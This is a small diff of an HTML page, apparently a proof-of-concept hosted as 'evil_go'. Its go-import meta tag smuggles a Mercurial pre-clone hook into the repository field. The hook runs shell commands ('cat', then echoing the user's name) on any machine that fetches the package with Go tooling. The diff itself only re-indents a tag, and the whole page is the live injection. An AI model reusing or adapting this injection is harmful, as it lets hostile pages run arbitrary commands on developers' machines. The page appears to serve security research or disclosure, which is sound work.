@@ -2,6 +2,6 @@
     <html>
     <head>
     <meta name="go-import" content="mahmoudgamalmmg8.github.io/evil_go/package hg --config=hooks.pre-clone=cat${IFS};echo${IFS}hello${IFS}$USER;echo${IFS}https://>/dev/null">
-    </head>
+   </head>
     <body>ok</body>
     </html>
